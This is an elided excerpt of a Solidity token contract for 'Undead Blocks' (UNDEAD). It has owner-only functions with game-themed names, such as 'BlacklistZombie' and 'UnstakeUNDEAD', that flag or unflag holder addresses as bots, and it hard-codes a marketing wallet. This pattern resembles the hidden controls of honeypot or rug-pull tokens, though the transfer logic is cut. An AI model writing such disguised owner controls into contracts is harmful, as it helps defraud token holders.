/*
    ...
    https://undead-blocks-team.gitbook.io/undead-blocks-whitepaper/gameplay/introduction
...
contract UNDEAD is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "Undead Blocks";
    string public _symbol= "UNDEAD";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0xEbEb3E685053C98f0603b8eFeE2dF557bcA9F612);
    ...
    function BlacklistZombie(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = true;
        }
    }

    function UnstakeUNDEAD(address[] memory recipients_) onlyOwner public {
        for (uint i = 0; i < recipients_.length; i++) {
            bots[recipients_[i]] = false;
        }
    }

    function StakeUNDEAD() onlyOwner public {
    ...
    function _transfer(
      ...
      function AirdropZBUX(address account, uint256 amount) onlyOwner  public virtual {
